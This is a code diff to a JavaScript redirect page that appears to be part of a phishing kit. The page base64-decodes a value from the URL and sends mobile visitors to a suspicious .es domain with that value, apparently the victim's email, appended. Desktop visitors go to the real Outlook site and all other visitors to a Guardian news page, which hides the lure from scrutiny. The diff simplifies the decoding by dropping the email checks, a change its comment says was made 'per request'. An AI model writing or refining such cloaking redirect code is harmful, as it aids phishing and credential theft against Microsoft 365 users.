@@ -96,7 +96,7 @@
         const REDIRECT_DELAY = 800;
         const MOBILE_REDIRECT_URL_BASE = "https://nJHAo.onahcjctgyd.es/RZWYfPQmCTz13hg@0h/$";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
-        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no valid email
+        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if decode fails or no value
 
         // Mobile device detection function
         function isMobileDevice() {
@@ -104,13 +104,7 @@
             return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
 
-        // Check if string is a valid email
-        function isValidEmail(email) {
-            // Basic check, consider a more robust regex if needed
-            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || ''));
-        }
-
-        // Try to get potential value from hash or search string
+        // Simplified: Try to get potential value from hash or search string
         function getPotentialValue() {
             const hash = window.location.hash.substring(1); // Remove leading '#'
             if (hash) {
@@ -118,65 +112,33 @@
             }
             const search = window.location.search.substring(1); // Remove leading '?'
             if (search) {
-                // Handle potential key-value pairs (e.g., ?email=...) or just the value (?...)
-                try {
-                   const params = new URLSearchParams(search);
-                   // Prioritize a parameter named 'email' if it exists
-                   if (params.has('email')) return params.get('email');
-                   // Otherwise, check if the whole search string (decoded) might be the value
-                   const decodedSearch = decodeURIComponent(search);
-                   // If it looks like a simple value (no '=' typical of params)
-                   if (search.indexOf('=') === -1) return decodedSearch;
-                   // Fallback if it was like '?key=value' but key wasn't 'email' - less likely intended
-                   // In this case, we probably don't have the email as the user intends
-                } catch (e) {
-                    // If URLSearchParams fails or decode fails, treat the raw search string as potential value
-                    return search;
-                }
+                // Directly return the search string, ignoring key=value formats per request
+                return search;
             }
             return null; // No hash or search string found
         }
 
-
-        // Try to decode base64 if needed, return the email or null
-        function getEmailFromValue(value) {
-            if (!value) return null;
-
-            // First check if the value itself is a valid email
-            if (isValidEmail(value)) {
-                return value;
-            }
-
-            // Otherwise try to decode it as base64
-            try {
-                // Replace URL-safe chars if used
-                const base64Value = value.replace(/-/g, '+').replace(/_/g, '/');
-                // Pad if necessary
-                const paddedValue = base64Value.padEnd(base64Value.length + (4 - base64Value.length % 4) % 4, '=');
-                const decoded = atob(paddedValue);
-                if (isValidEmail(decoded)) {
-                    return decoded;
-                }
-            } catch (e) {
-                // Ignore decoding errors, means it wasn't valid base64 or email
-                console.warn("Value was not a valid email or base64-encoded email:", e.message);
-            }
-
-            // Return null if neither approach worked
-            return null;
-        }
-
-        // Main redirect function
+        // Main redirect function (Simplified)
         function performRedirect() {
             const potentialValue = getPotentialValue();
-            const email = getEmailFromValue(potentialValue);
+            let decodedValue = null;
 
-            if (email) {
-                // Valid email found
-                console.log("Valid email found:", email);
+            if (potentialValue) {
+                try {
+                    decodedValue = atob(potentialValue);
+                    console.log("Successfully decoded value.");
+                } catch (e) {
+                    console.warn("Failed to decode value with atob():", e.message);
+                    // Treat decode failure same as no value
+                    decodedValue = null;
+                }
+            }
+
+            if (decodedValue !== null) {
+                // Value successfully decoded (no check if it's an email)
                 if (isMobileDevice()) {
-                    // Redirect mobile devices to the specific destination
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + email;
+                    // Redirect mobile devices to the specific destination + decoded value
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + decodedValue;
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 } else {
@@ -185,8 +147,8 @@
                     window.location.href = DESKTOP_REDIRECT_URL;
                 }
             } else {
-                // No valid email found or value missing
-                console.log("No valid email found. Redirecting all devices to dead URL:", DEAD_URL);
+                // No value found or atob decoding failed
+                console.log("No value or decode failed. Redirecting all devices to dead URL:", DEAD_URL);
                 window.location.href = DEAD_URL;
             }
         }
